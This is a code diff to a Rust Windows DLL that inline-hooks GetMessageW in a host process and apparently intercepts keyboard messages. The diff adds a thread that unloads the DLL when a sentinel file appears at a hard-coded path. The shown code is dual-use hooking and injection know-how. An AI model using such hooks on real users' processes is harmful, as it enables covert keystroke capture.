@@ -25,14 +25,16 @@ use std::ptr::null_mut;
 use std::sync::atomic::{AtomicPtr, Ordering};
 use std::arch::asm;
 use std::fs::File;
+use std::thread;
 
 use winapi::shared::windef::{HWND, POINT};
 use winapi::shared::minwindef::{DWORD, HINSTANCE, FARPROC, BOOL, UINT, WPARAM, LPARAM};
 use winapi::um::errhandlingapi::GetLastError;
 use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
-use winapi::shared::minwindef::{HINSTANCE__};
+use winapi::shared::minwindef::HINSTANCE__;
 use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};
 use winapi::um::winuser::{LPMSG, WM_KEYDOWN, MapVirtualKeyW};
+use winapi::um::libloaderapi::{FreeLibraryAndExitThread, GetModuleHandleW};
 
 extern crate simplelog;
 extern crate log;
@@ -43,8 +45,14 @@ use time::macros::format_description;
 
 
 const NUM_STOLEN_BYTES: usize = 18;
+const UNLOAD_FILE_PATH: &str = "C:\\Users\\User\\Music\\test.txt";
 
 static TRAMPOLINE_FUNC: AtomicPtr<()> = AtomicPtr::new(std::ptr::null_mut());
+
+// This struct is used to store the handle to the DLL instance
+// which implements the Send trait, allowing it to be sent to other threads
+struct SafeHINSTANCE(*mut HINSTANCE__);
+unsafe impl Send for SafeHINSTANCE {} 
 
 
 #[repr(C)]
@@ -61,6 +69,9 @@ struct MSG {
 #[cfg(target_os = "windows")]
 #[no_mangle]
 pub extern "system" fn DllMain(hinst_dll: *mut HINSTANCE__, fdw_reason: u32, _: usize) -> bool {
+    // Create instance of SafeHINSTANCE
+    let safe_hinst_dll = SafeHINSTANCE(hinst_dll);
+
     if fdw_reason == winapi::um::winnt::DLL_PROCESS_ATTACH {
         // Initialize the logger
         let config = ConfigBuilder::new()
@@ -73,13 +84,44 @@ pub extern "system" fn DllMain(hinst_dll: *mut HINSTANCE__, fdw_reason: u32, _: 
         let target_function_name: &str = "GetMessageW";
 
         info!("[{}] fwd_reason: {}", "DllMain", "DLL_PROCESS_ATTACH");
-        info!("[{}] Base address of the DLL: {:?}", "DllMain", hinst_dll);
+        info!("[{}] Base address of the DLL: {:?}", "DllMain", hinst_dll.clone());
         info!("[{}] Target module name: {}", "DllMain", target_module_name);
         info!("[{}] Target function name: {}", "DllMain", target_function_name);
+
+        // Create a new thread which will await the unload signal
+        thread::spawn(move || unload(safe_hinst_dll));
 
         begin_hooking(target_module_name, target_function_name);
     } 
     true
+}
+
+fn unload(safe_hinst_dll: SafeHINSTANCE) {
+    loop {
+        // Check if the UNLOAD_FILE_PATH exists
+        if std::path::Path::new(UNLOAD_FILE_PATH).exists() {
+            info!("[{}] Unload file found - Unloading", "unload");
+            
+            // Unload the DLL
+            unsafe {
+                let hmodule = if safe_hinst_dll.0.is_null() {
+                    GetModuleHandleW(null_mut())
+                } else {
+                    safe_hinst_dll.0
+                };
+
+                if hmodule == null_mut() {
+                    error!("[{}] Failed to get handle to DLL", "unload");
+                    if let Some(win_err) = get_last_error() {
+                        error!("[{}] Windows error: {}", "unload", win_err);
+                    }
+                    return;
+                }
+
+                FreeLibraryAndExitThread(hmodule, 0);
+            }
+        }
+    };
 }
 
 fn begin_hooking(target_module_str: &str, target_function_name: &str) {
